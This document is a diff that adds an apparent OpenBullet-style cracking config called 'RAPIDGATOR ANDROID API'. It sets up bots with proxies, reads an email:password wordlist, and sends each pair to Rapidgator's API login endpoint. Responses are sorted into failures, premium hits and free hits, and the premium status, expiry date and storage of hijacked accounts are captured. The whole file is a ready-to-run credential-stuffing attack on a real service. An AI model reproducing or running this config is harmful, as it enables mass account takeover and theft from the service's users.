@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "RAPIDGATOR ANDROID API",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-07-26T11:41:05.4494274+05:30",
+  "AdditionalInfo": "",
+  "Author": "●Pratham●#3277",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://rapidgator.net/api/v2/user/login?login=<USER>&password=<PASS>" 
+  
+  HEADER "Host: rapidgator.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Server: nginx" 
+  HEADER "Date: Sat, 24 Jul 2021 07:16:50 GMT" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: no-cache,must-revalidate" 
+  HEADER "Access-Control-Allow-Origin: *" 
+  HEADER "Content-Encoding: gzip" 
+  HEADER "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload" 
+  HEADER "X-Frame-Options: SAMEORIGIN" 
+  HEADER "X-XSS-Protection: 1; mode=block" 
+  HEADER "X-Content-Type-Options: nosniff" 
+  HEADER "Content-Length: 92" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Wrong e-mail or password." 
+    KEY "Error: Login or password is wrong" 
+  KEYCHAIN Success OR 
+    KEY "\"is_premium\":true,\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"is_premium\":false,\"" 
+
+#is_Premium PARSE "<SOURCE>" LR "\"is_premium\":" ",\"" CreateEmpty=FALSE -> CAP "is Premium" 
+
+#Premium_End_Date PARSE "<SOURCE>" LR "\"premium_end_time\":" ",\"" CreateEmpty=FALSE -> CAP "Premium End Date" 
+
+#Total_Storage PARSE "<SOURCE>" LR "{\"total\":\"" "\"" CreateEmpty=FALSE -> CAP "Total Storage" 
+
+#Remaining_Storage PARSE "<SOURCE>" LR "\"left\":\"" "\"" CreateEmpty=FALSE -> CAP "Remaining Storage" 
+
+#Status PARSE "<SOURCE>" LR "\"state_label\":\"" "\"" CreateEmpty=FALSE -> CAP "Status" 
+
+FUNCTION Constant "@Pratham09" -> CAP "Config By - " 
+
